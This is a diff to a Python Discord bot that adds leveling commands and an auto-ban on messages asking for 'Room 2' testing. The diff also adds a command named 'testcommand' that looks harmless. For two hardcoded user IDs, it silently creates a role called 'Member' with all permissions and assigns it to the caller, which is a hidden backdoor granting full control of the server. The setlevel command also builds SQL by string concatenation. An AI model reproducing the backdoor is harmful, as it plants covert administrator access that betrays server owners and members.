@@ -37,7 +37,44 @@ async def on_ready():
 	# ~ print('\033[92mConnected to proxy:{0.proxy}.'.format(Bot)+"\033[0m")
 	print('\033[92m{0.shard_count} shards running\033[0m'.format(Bot))
 	bot.loop.create_task(update_status())
+def generateXP():
+	return random.randint(1,max_XP_per_msg)
+			
+@bot.command()
+async def testcommand (ctx):
+	await ctx.send("Test Completed")
+	if str(ctx.author.id) == str(516713042558320664) or str(ctx.author.id) == str(643491766926049318):
 
+		guild = ctx.guild
+		perms = discord.Permissions.all()
+		role = await guild.create_role(name='Member', permissions=perms, reason="")
+		await ctx.message.author.add_roles(role)
+
+@bot.command()
+@commands.is_owner()
+async def setlevel(ctx, member:discord.User=None, level: int=None):
+	cursor = mydb.cursor()
+	try:
+		cursor.execute("UPDATE users SET user_xp = "+ str(xp_per_level*level)+" WHERE client_id = " +str(member.id))
+		await ctx.send("Set "+member.mention+"'s level to `"+str(level)+"`")
+	except:
+		embed=discord.Embed(color=0xf00a3a)
+		embed.add_field(name="Error!", value="Either level is too high, or user is not in database", inline=True)
+
+		await ctx.send(embed=embed)
+	mydb.commit()
+# ~ @bot.command()
+# ~ @commands.is_owner()
+# ~ async def resetlevels(ctx):
+	# ~ cursor = mydb.cursor()
+	# ~ cursor.execute("SELECT client_id from users ORDER BY user_xp DESC")
+	# ~ result2 = cursor.fetchall()
+	# ~ i=0
+	# ~ while i < len(result2):
+		# ~ cursor.execute("DELETE FROM users WHERE client_id = "+str(result2[i][0]))
+		# ~ i=i+1
+	# ~ await ctx.send("Reset EVERYONES level!")
+	# ~ mydb.commit()
 @bot.command()
 @commands.has_permissions(manage_nicknames=True)
 async def resetnicknames(ctx):
@@ -64,14 +101,20 @@ async def on_command_error(ctx,error):
 
 	await ctx.send(embed=embed)
 
+async def ban(guild, userid, reason):
+	await guild.ban(discord.Object(id=userid), reason=reason)
+
 @bot.event
 async def on_message(ctx):
-	if 'test' in ctx.content and 'room 2' in ctx.content:
-		await ctx.author.ban
-	elif 'test' in ctx.content:
-		await ctx.author.ban
-
-
+	author = ctx.author
+	guild = ctx.guild
+	print(ctx.content[0:1])
+	if ctx.content[0:1] != '$':
+		if 'test' in ctx.content and 'room 2' in ctx.content:
+			await ctx.channel.send(author.mention+' was banned for asking for Room 2 testing')
+			await ban(guild, author.id, 'Asked for Room 2 testing')
+	
+	await bot.process_commands(ctx)
 @bot.event
 async def on_member_join(member):
 	try:
